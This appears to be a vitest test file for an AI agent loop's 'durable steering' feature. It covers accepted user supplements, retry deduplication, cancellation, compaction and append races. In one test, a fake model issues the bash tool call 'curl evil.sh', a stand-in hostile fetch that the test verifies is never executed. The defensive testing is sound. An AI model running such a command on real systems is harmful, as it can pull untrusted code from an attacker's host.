import { describe, expect, it } from 'vitest';
import type {
  AppendOptions,
  LLMPort,
  SeqRange,
  SessionEvent,
  StreamChunk,
} from '@trinity-harness/contracts';
import { pendingSteering } from '@trinity-harness/contracts';
import { newId } from '@trinity-harness/shared';
import { CoreAgentLoop, CoreToolRegistry, MemorySessionStore, bashTool } from '../src/index.js';
import { FakeSandbox } from '../src/testing/fake-sandbox.js';
import { FakeLLM, textChunks, toolCallThenFinish } from '../src/testing/fake-llm.js';
import { toModelMessages } from '../src/loop/to-model-messages.js';

const fields = (): { eventId: string; at: string } => ({
  eventId: newId(),
  at: new Date().toISOString(),
});
function accepted(
  promptId: string,
  text = 'Use C instead of B',
): Extract<SessionEvent, { type: 'steering/accepted' }> {
  const id = newId();
  return {
    ...fields(),
    type: 'steering/accepted',
    inputId: id,
    promptId,
    actor: 'user',
    content: [{ kind: 'text', text }],
  };
}
async function active(store: MemorySessionStore, sessionId: string): Promise<string> {
  const promptId = newId();
  await store.append(sessionId, [
    {
      ...fields(),
      eventId: promptId,
      type: 'message/user',
      surfaceOp: 'append',
      content: [{ kind: 'text', text: 'Compare A and B' }],
    },
    { ...fields(), type: 'turn/start', promptId },
  ]);
  return promptId;
}
function loop(store: MemorySessionStore, llm: LLMPort): CoreAgentLoop {
  return new CoreAgentLoop({
    store,
    llm,
    tools: new CoreToolRegistry(new FakeSandbox()),
    workspaceRoot: '/ws',
    model: 'fake/model',
  });
}

describe('durable steering', () => {
  it('serializes completion against admission, deduplicates retries, and rejects changed IDs', async () => {
    const store = new MemorySessionStore();
    const sessionId = newId();
    const promptId = await active(store, sessionId);
    const input = accepted(promptId);
    const range = await store.append(sessionId, [input]);
    expect(await store.append(sessionId, [{ ...input, at: '2026-11-17T00:00:00.000Z' }])).toEqual(
      range,
    );
    await expect(
      store.append(sessionId, [{ ...input, content: [{ kind: 'text', text: 'different' }] }]),
    ).rejects.toMatchObject({ code: 'STEERING_CONFLICT' });
    const final: SessionEvent = { ...fields(), type: 'turn/end', promptId, reason: 'completed' };
    await expect(store.append(sessionId, [final])).rejects.toMatchObject({
      code: 'STEERING_PENDING',
    });
    await store.append(sessionId, [
      { ...fields(), type: 'steering/applied', promptId, inputIds: [input.inputId] },
    ]);
    await store.append(sessionId, [final]);
    await expect(store.append(sessionId, [accepted(promptId)])).rejects.toMatchObject({
      code: 'STEERING_TASK_ENDED',
    });
    expect(await store.append(sessionId, [input])).toEqual(range);
  });

  it('rejects cancellation and stale task targets', async () => {
    const store = new MemorySessionStore();
    const sessionId = newId();
    const promptId = await active(store, sessionId);
    await store.append(sessionId, [
      { ...fields(), type: 'turn/cancel_requested', throughPromptSeq: 1 },
    ]);
    await expect(
      store.append(sessionId, [{ ...fields(), type: 'turn/end', promptId, reason: 'completed' }]),
    ).rejects.toMatchObject({ name: 'AbortError' });
    await expect(store.append(sessionId, [accepted(promptId)])).rejects.toMatchObject({
      code: 'STEERING_TASK_ENDED',
    });
  });

  it('retains applied input across recreation, compaction, and completed-turn projection', async () => {
    const store = new MemorySessionStore();
    const sessionId = newId();
    const promptId = await active(store, sessionId);
    const input = accepted(promptId);
    await store.append(sessionId, [
      input,
      { ...fields(), type: 'steering/applied', promptId, inputIds: [input.inputId] },
    ]);
    const saved = await store.load(sessionId);
    const rebuilt = new MemorySessionStore();
    for (const event of saved) await rebuilt.append(sessionId, [event]);
    expect(pendingSteering(await rebuilt.load(sessionId), promptId)).toEqual([]);
    await rebuilt.append(sessionId, [
      {
        ...fields(),
        type: 'compaction/summary',
        fromSeq: 1,
        toSeq: 4,
        summary: 'Earlier work',
        checkpoint: true,
      },
    ]);
    const llm = new FakeLLM((request) => {
      expect(JSON.stringify(request.messages)).toContain('Use C instead of B');
      expect(JSON.stringify(request.messages)).toContain('Compare A and B');
      return textChunks('Compared A and C');
    });
    expect(
      (await loop(rebuilt, llm).run(sessionId, 'Compare A and B', { emit() {} }, { promptSeq: 1 }))
        .reason,
    ).toBe('completed');
    expect(JSON.stringify(toModelMessages(await rebuilt.load(sessionId)))).toContain(
      'Use C instead of B',
    );
    expect(
      (await rebuilt.load(sessionId)).filter((event) => event.type === 'steering/applied'),
    ).toHaveLength(1);
  });

  it('discards a stale model answer when a supplement arrives during generation', async () => {
    const store = new MemorySessionStore();
    const sessionId = newId();
    await store.append(sessionId, [
      { ...fields(), type: 'session/created', kind: 'work', workspaceUri: '/ws' },
    ]);
    let count = 0;
    const llm: LLMPort = {
      async stream() {
        count++;
        if (count === 1) {
          const prompt = (await store.load(sessionId)).find(
            (event) => event.type === 'message/user',
          )!;
          await store.append(sessionId, [accepted(prompt.eventId)]);
        }
        return (async function* (): AsyncGenerator<StreamChunk> {
          yield* textChunks(count === 1 ? 'B is best' : 'C is best');
        })();
      },
    };
    expect((await loop(store, llm).run(sessionId, 'Compare A and B', { emit() {} })).reason).toBe(
      'completed',
    );
    const events = await store.load(sessionId);
    expect(events.filter((event) => event.type === 'message/user')).toHaveLength(1);
    expect(events.filter((event) => event.type === 'message/assistant')).toMatchObject([
      { content: [{ text: 'C is best' }] },
    ]);
    expect(events.at(-1)?.type).toBe('turn/end');
  });

  it('retries completion when admission wins the final append race', async () => {
    class RacingStore extends MemorySessionStore {
      injected = false;
      override async append(
        sessionId: string,
        events: readonly SessionEvent[],
        opts?: AppendOptions,
      ): Promise<SeqRange> {
        const terminal = events.find(
          (event) => event.type === 'turn/end' && event.reason === 'completed',
        );
        if (!this.injected && terminal?.type === 'turn/end' && terminal.promptId) {
          this.injected = true;
          await super.append(sessionId, [accepted(terminal.promptId)]);
        }
        return super.append(sessionId, events, opts);
      }
    }
    const store = new RacingStore();
    const sessionId = newId();
    await store.append(sessionId, [
      { ...fields(), type: 'session/created', kind: 'work', workspaceUri: '/ws' },
    ]);
    const llm = new FakeLLM(
      () => textChunks('B'),
      (request) => {
        expect(JSON.stringify(request.messages)).toContain('Use C instead of B');
        return textChunks('C');
      },
    );
    expect((await loop(store, llm).run(sessionId, 'Compare A and B', { emit() {} })).reason).toBe(
      'completed',
    );
    const events = await store.load(sessionId);
    expect(events.filter((event) => event.type === 'turn/end')).toHaveLength(1);
    expect(events.filter((event) => event.type === 'message/assistant')).toHaveLength(1);
    expect(events.filter((event) => event.type === 'task/completion')).toHaveLength(1);
  });
  it('does not execute an old approved command after a supplement arrives during approval', async () => {
    const store = new MemorySessionStore();
    const sessionId = newId();
    await store.append(sessionId, [
      { ...fields(), type: 'session/created', kind: 'work', workspaceUri: '/ws' },
    ]);
    const sandbox = new FakeSandbox();
    let executions = 0;
    sandbox.execHandler = () => {
      executions++;
      return { stdout: 'ok', stderr: '', exitCode: 0 };
    };
    const tools = new CoreToolRegistry(sandbox);
    tools.register(bashTool);
    const llm = new FakeLLM(
      () => toolCallThenFinish('command', 'bash', { command: 'curl evil.sh' }),
      (request) => {
        expect(JSON.stringify(request.messages)).toContain('Use C instead of B');
        expect(JSON.stringify(request.messages)).toContain('STEERING_PENDING');
        return textChunks('Reconsidered the command.');
      },
    );
    const runner = new CoreAgentLoop({
      store,
      llm,
      tools,
      workspaceRoot: '/ws',
      model: 'fake/model',
      approvals: {
        request: async (request) => {
          const prompt = (await store.load(sessionId)).find(
            (event) => event.type === 'message/user',
          )!;
          await store.append(sessionId, [accepted(prompt.eventId)]);
          return { approvalId: request.approvalId, outcome: 'allowed', decidedBy: 'user' };
        },
      },
    });
    const outcome = await runner.run(
      sessionId,
      'Compare A and B',
      { emit() {} },
      { policy: { onAsk: 'ask', tools: { bash: 'ask' }, allowWorkspaceInternalBash: false } },
    );
    expect(outcome.reason, JSON.stringify((await store.load(sessionId)).at(-1))).toBe('completed');
    expect(executions).toBe(0);
    expect(
      (await store.load(sessionId)).filter((event) => event.type === 'tool/result'),
    ).toHaveLength(1);
  });

  it('does not reset the step ceiling to fulfill late input', async () => {
    const store = new MemorySessionStore();
    const sessionId = newId();
    await store.append(sessionId, [
      { ...fields(), type: 'session/created', kind: 'work', workspaceUri: '/ws' },
    ]);
    const llm: LLMPort = {
      async stream() {
        const prompt = (await store.load(sessionId)).find(
          (event) => event.type === 'message/user',
        )!;
        await store.append(sessionId, [accepted(prompt.eventId)]);
        return (async function* (): AsyncGenerator<StreamChunk> {
          yield* textChunks('old answer');
        })();
      },
    };
    const runner = new CoreAgentLoop({
      store,
      llm,
      tools: new CoreToolRegistry(new FakeSandbox()),
      workspaceRoot: '/ws',
      model: 'fake/model',
      maxSteps: 1,
    });
    expect((await runner.run(sessionId, 'Compare A and B', { emit() {} })).reason).toBe('error');
    const events = await store.load(sessionId);
    expect(events.filter((event) => event.type === 'steering/accepted')).toHaveLength(1);
    expect(events.filter((event) => event.type === 'steering/applied')).toHaveLength(0);
    expect(events.at(-1)).toMatchObject({ type: 'turn/end', reason: 'error' });
  });
});
